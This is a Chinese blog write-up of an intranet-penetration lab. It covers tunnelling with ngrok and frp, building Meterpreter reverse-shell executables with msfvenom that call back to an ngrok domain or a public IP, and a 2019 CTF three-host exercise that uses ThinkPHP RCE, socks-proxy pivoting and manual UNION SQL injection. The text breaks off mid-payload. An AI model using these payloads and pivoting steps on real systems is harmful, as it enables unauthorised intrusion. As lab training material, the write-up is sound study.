<h2 id="内网穿透Ngrok测试-两个内网通讯上线"><a href="#内网穿透Ngrok测试-两个内网通讯上线" class="headerlink" title="内网穿透Ngrok测试-两个内网通讯上线"></a>内网穿透Ngrok测试-两个内网通讯上线</h2><h3 id="Ngork"><a href="#Ngork" class="headerlink" title="Ngork"></a>Ngork</h3><p>ngrok 是一个反向代理，通过在<strong>公共的端点</strong>和<strong>本地运行的 Web 服务器</strong>之间建立一个<strong>安全的通道</strong>。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放。</p>
<p><strong>反向代理</strong>在计算机网络中是代理服务器的一种。服务器根据客户端的请求，从其关系的一组或多组后端服务器（如Web服务器）上获取资源，然后再将这些资源返回给客户端，客户端只会得知反向代理的IP地址，而不知道在代理服务器后面的服务器集群的存在。</p>
<h4 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h4><p><a href="https://ngrok.com/">https://ngrok.com/</a></p>
<p>访问上述网址，注册登录后下载运行文件（注意区分操作系统），并获取自己账号对应的auth</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220312234902072.png" alt="image-20220312234902072"></p>
<p>题外话：</p>
<p>压缩文件 非打包</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment"># touch a.c       </span></span><br><span class="line"><span class="comment"># tar -czvf test.tar.gz a.c   //压缩 a.c文件为test.tar.gz</span></span><br><span class="line"><span class="keyword">a</span>.c</span><br></pre></td></tr></table></figure>

<p>列出压缩文件内容</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tar -tzvf test.tar.gz </span></span><br><span class="line">-rw-r<span class="comment">--r-- root/root     0 2010-05-24 16:51:59 a.c</span></span><br></pre></td></tr></table></figure>

<p>解压文件</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tar -xzvf test.tar.gz </span></span><br><span class="line"><span class="keyword">a</span>.c</span><br></pre></td></tr></table></figure>

<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://learnku.com/articles/36003">https://learnku.com/articles/36003</a></p>
<p><a href="https://www.thinbug.com/q/55014750">https://www.thinbug.com/q/55014750</a></p>
<p><a href="https://www.jianshu.com/p/571fdbc98d25">https://www.jianshu.com/p/571fdbc98d25</a></p>
<h4 id="实验测试"><a href="#实验测试" class="headerlink" title="实验测试"></a>实验测试</h4><p>基本攻击思路如下图</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313222625737.png" alt="image-20220313222625737"></p>
<h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>攻击机：kali，ip    192.168.184.128，NAT模式</p>
<p>目标机：win7， ip    192.168.123.128，NAT模式</p>
<p>这里通过我的电脑虚拟机，和室友的电脑虚拟机建立两个内网，互相不能ping通（实在找不到两个不同内网也能用本地两台虚拟机模拟）</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313110352213.png" alt="image-20220313110352213"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313110456884.png" alt="image-20220313110456884"></p>
<p>题外话（NAT-Network Address Translation）：</p>
<p>当在专用网（私网）内部的一些主机本来已经分配到了本地IP地址（即仅在本专用网内使用的专用地址），但又想和因特网上的主机通信（并不需要加密）时，可使用NAT方法。</p>
<p>NAT不仅能解决IP地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。</p>
<p>1.宽带分享：这是 NAT 主机的最大功能。</p>
<p>2.安全防护：NAT 之内的 PC 联机到 Internet 上面时，他所显示的 IP 是 NAT 主机的公共 IP，所以 Client 端的 PC  当然就具有一定程度的安全了，外界在进行 portscan（端口扫描） 的时候，就侦测不到源Client 端的 PC 。</p>
<h5 id="启动ngork"><a href="#启动ngork" class="headerlink" title="启动ngork"></a>启动ngork</h5><p><code>./ngork http 192.168.128:2333</code></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313110602345.png" alt="image-20220313110602345"></p>
<p>这里代理服务器会将收到的消息转发到攻击机的2333端口</p>
<h5 id="利用msf生成木马"><a href="#利用msf生成木马" class="headerlink" title="利用msf生成木马"></a>利用msf生成木马</h5><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sfvenom</span> -p windows/meterpreter/reverse_http lhost=a<span class="number">40</span>a-<span class="number">182</span>-<span class="number">150</span>-<span class="number">122</span>-<span class="number">182</span>.ngrok.io lport=<span class="number">80</span> -f exe -o test<span class="number">1</span>.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意</span></span><br><span class="line"><span class="comment"># 这里lhost的值要与代理服务器一致</span></span><br><span class="line"><span class="comment"># lport=80，我理解的是利用木马使目标机走http协议(80端口)连接代理服务器，因为代理服务器也没有开放其他监听端口来监听目标机的连接</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313112814001.png" alt="image-20220313112814001"></p>
<p>生成后将木马传到目标机上</p>
<h5 id="msf配置监听"><a href="#msf配置监听" class="headerlink" title="msf配置监听"></a>msf配置监听</h5><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313191141668.png" alt="image-20220313191141668"></p>
<h5 id="获取目标主机会话"><a href="#获取目标主机会话" class="headerlink" title="获取目标主机会话"></a>获取目标主机会话</h5><p>在目标主机运行木马，ngork收到http requests（这个过程可能会比较慢，可以多次运行木马文件）</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313191359583.png" alt="image-20220313191359583"></p>
<p>并且msf收到会话</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313191715343.png" alt="image-20220313191715343"></p>
<p>到此已打通两个内网主机，实现通信</p>
<h2 id="内网穿透Frp自建跳板测试-两个内网通讯上线"><a href="#内网穿透Frp自建跳板测试-两个内网通讯上线" class="headerlink" title="内网穿透Frp自建跳板测试-两个内网通讯上线"></a>内网穿透Frp自建跳板测试-两个内网通讯上线</h2><p>两个不同内网通讯示意图如下：</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220312225244562.png" alt="image-20220312225244562"></p>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>自行搭建，方便修改，成本低，使用多样化</p>
<h3 id="frp配置"><a href="#frp配置" class="headerlink" title="frp配置"></a>frp配置</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>（阿里云主机需要修改安全组配置出入口）</p>
<p>下载-解压-修改-启动</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务器修改配置文件frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">6677</span> <span class="comment"># frps工作端口，必须和frpc保持一致</span></span><br><span class="line"><span class="comment"># 启动服务端：</span></span><br><span class="line">./frps -c ./frps.ini <span class="comment"># 若无法运行使用chmod添加执行权限</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313231614464.png" alt="image-20220313231614464"></p>
<h4 id="控制端"><a href="#控制端" class="headerlink" title="控制端"></a>控制端</h4><p>下载-解压-修改-启动</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 控制端修改配置文件frpc.ini：</span></span><br><span class="line"></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = 云主机ip</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">6677</span> <span class="comment"># frpc工作端口，必须和frps保持一致</span></span><br><span class="line"></span><br><span class="line"><span class="section">[msf]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">5555</span> <span class="comment"># 转发给本机的5555</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6666</span> <span class="comment"># 服务端用6666端口转发给本机,6666端口也负责接收目标主机的回连</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动客户端</span></span><br><span class="line">./frpc -c ./frpc.ini <span class="comment"># 若无法运行使用chmod添加执行权限</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313232359476.png" alt="image-20220313232359476"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313232454388.png" alt="image-20220313232454388"></p>
<h3 id="msf-frp联动"><a href="#msf-frp联动" class="headerlink" title="msf+frp联动"></a>msf+frp联动</h3><h4 id="msf生成木马"><a href="#msf生成木马" class="headerlink" title="msf生成木马"></a>msf生成木马</h4><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=121.4.209.19 lport=6666 -f exe -o frp.exe</code></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220313234704665.png" alt="image-20220313234704665"></p>
<h4 id="msf本地开启监听"><a href="#msf本地开启监听" class="headerlink" title="msf本地开启监听"></a>msf本地开启监听</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 127.0.0.1</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意不要打错了，不然会出现有session但没有返回meterpreter的情况</span></span><br></pre></td></tr></table></figure>

<h4 id="运行frp"><a href="#运行frp" class="headerlink" title="运行frp"></a>运行frp</h4><p>开启frp服务后，在目标主机执行木马文件frp.exe，便会收到会话</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220314114842998.png" alt="image-20220314114842998"></p>
<h2 id="ngork和frp"><a href="#ngork和frp" class="headerlink" title="ngork和frp"></a>ngork和frp</h2><p>fps自建，可以让自己传输的数据不被外人监听</p>
<p>ngork是别人的服务器，传输数据可能存在被别人偷听</p>
<h2 id="CFS三层内网漫游安全测试-某CTF线下2019"><a href="#CFS三层内网漫游安全测试-某CTF线下2019" class="headerlink" title="CFS三层内网漫游安全测试-某CTF线下2019"></a>CFS三层内网漫游安全测试-某CTF线下2019</h2><p><em>CFS</em>（竞速夺旗）</p>
<p>来源：2019某CTF线下赛真题内网结合WEB攻防题库，涉及WEB攻击，内网代理路由等技术，每台服务器存在一个Flag，获取每一个Flag对应一个积分，获取三个Flag结束。</p>
<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220315071346520.png" alt="image-20220315071346520"></p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载靶机后，导入VM中</p>
<h4 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h4><p>编辑-&gt;虚拟网络编辑器</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220314215917939.png" alt="image-20220314215917939"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220314215942383.png" alt="image-20220314215942383"></p>
<h5 id="target1"><a href="#target1" class="headerlink" title="target1"></a>target1</h5><p>双网卡</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220314220218043.png" alt="image-20220314220218043"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220322122558533.png" alt="image-20220322122558533"></p>
<p>还需要配置宝塔</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220328231845438.png" alt="image-20220328231845438"></p>
<p>访问：<a href="http://192.168.184.142:8888/a768f109/">http://192.168.184.142:8888/a768f109/</a></p>
<p>添加如下配置</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220328232452306.png" alt="image-20220328232452306"></p>
<h5 id="target2"><a href="#target2" class="headerlink" title="target2"></a>target2</h5><p>双网卡</p>
<p>配置网卡操作同target1</p>
<p>更改ip地址操作如下</p>
<p>1.打开<code>vi /etc/network/interfaces</code>文件</p>
<p>2.编辑后重启</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220314225900399.png" alt="image-20220314225900399"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220314230054351.png" alt="image-20220314230054351"></p>
<p>还需要配置宝塔（这里多弄一张nat网卡才能访问宝塔面板）</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220328232935221.png" alt="image-20220328232935221"></p>
<p>访问：<a href="http://192.168.184.145:8888/2cc52ec0/">http://192.168.184.145:8888/2cc52ec0/</a></p>
<p>不知道为啥这里显示的password是错的，网上搜到密码应该是<code>123qwe..</code></p>
<p>添加配置如下</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220328233502253.png" alt="image-20220328233502253"></p>
<p>配置完后关闭这张nat网卡</p>
<h5 id="target3"><a href="#target3" class="headerlink" title="target3"></a>target3</h5><p>单网卡</p>
<p>配置网卡同target1</p>
<p>更改ip地址操作如下：</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220314222801233.png" alt="image-20220314222801233"></p>
<h3 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h3><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220315071422010.png" alt="image-20220315071422010"></p>
<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>利用nmap进行C段扫描，得到target1的ip，<code>nmap 192.168.184.0/24</code></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220328225802598.png" alt="image-20220328225802598"></p>
<p>访问80端口，是一个thinkphp5搭建的web服务</p>
<p>先上扫描器扫后台</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220328234645647.png" alt="image-20220328234645647"></p>
<p>访问<code>/robots.txt</code>，拿到第一个flag</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220328234729762.png" alt="image-20220328234729762"></p>
<p>TP5可能存在RCE，于是利用msf的攻击模块去打</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329000208681.png" alt="image-20220329000208681"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/thinkphp_rce</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> rhosts 192.168.184.142</span><br><span class="line"><span class="builtin-name">set</span> rport 80</span><br><span class="line"><span class="builtin-name">set</span> targeturi /index.php</span><br><span class="line"><span class="builtin-name">set</span> lhost 192.168.184.128</span><br><span class="line"><span class="builtin-name">set</span> lport 1111</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>成功拿到shell，获取到web权限</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329000410415.png" alt="image-20220329000410415"></p>
<p>信息收集及配置访问</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">获取网络接口：<span class="builtin-name">run</span> get_local_subnets</span><br><span class="line"></span><br><span class="line">查看路由地址：<span class="builtin-name">run</span> autoroute -p</span><br><span class="line"></span><br><span class="line">添加路由地址：<span class="builtin-name">run</span> autoroute -s 192.168.22.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329090918434.png" alt="image-20220329090918434"></p>
<p> msf开启本地代理</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show <span class="keyword">options</span></span><br><span class="line"><span class="keyword">set</span> SRVHOST <span class="comment">192.168.184.128</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SRVPORT</span> 自定义端口</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329111935071.png" alt="image-20220329111935071"></p>
<p>利用本地代理接口进行访问测试</p>
<p><strong>linux</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf <span class="comment"># 找到配置文件位置</span></span><br></pre></td></tr></table></figure>

<p>添加如下内容</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329123846686.png" alt="image-20220329123846686"></p>
<p>利用<code>proxychains4</code>，对192.168.22.0/24网段进行探针</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80</span><br><span class="line"><span class="comment"># -Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span></span><br><span class="line"><span class="comment"># -sT：扫描TCP数据包已建立的连接connect</span></span><br></pre></td></tr></table></figure>

<p>这里探针到192.168.22.22的80端口开启</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329124542378.png" alt="image-20220329124542378"></p>
<p>这里还可以使用msf自带的端口扫描</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="builtin-name">set</span> rhosts 192.168.22.0/24</span><br><span class="line"><span class="builtin-name">set</span> threads 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><strong>windows</strong></p>
<p>利用代理工具<strong>Proxyfier</strong>或<strong>SocksCap64</strong>载入代理进行进程访问测试</p>
<p>在浏览器配置代理去访问刚刚过的的目标ip地址（这里在自己真实主机上通过设置代理也能访问到，因为主机能ping通192.168.184.128）</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329130318953.png" alt="image-20220329130318953"></p>
<p>这里利用<strong>SocksCap64</strong>结合御剑进行后台扫描（此操作在自己的物理主机上）</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329134654327.png" alt="image-20220329134654327"></p>
<p>但是对扫描到的路径和文件进行访问并没有可用信息，只在robots.txt文件中发现了后台登陆点<code>/index.php?r=admini</code></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329135335168.png" alt="image-20220329135335168"></p>
<p>继续找线索，在目标主页右键查看源码信息，得到Hint，该站点<code>/index.php?r=vul&amp;keyword=1</code>存在SQL注入</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329135026553.png" alt="image-20220329135026553"></p>
<p>这里最开始我是用kali里的sqlmap去跑的</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot;</span> <span class="params">--proxy=</span><span class="string">&quot;http://192.168.184.128:1080&quot;</span> -p keyword</span><br></pre></td></tr></table></figure>

<p>不知道为什么说不存在注入</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329184429802.png" alt="image-20220329184429802"></p>
<p>在物理机上的sqlmap更是扫不了，不知道为什么代理没起作用</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8Socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/image-20220329184736495.png" alt="image-20220329184736495"></p>
<p>最后我采用手工注入😭</p>
<ol>
<li><p>获取数据库</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.22.22</span>/index.php?r=vul&amp;keyword=<span class="number">1</span>&#x27; union select group_concat(schema_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span> from information_schema.schemata%<span 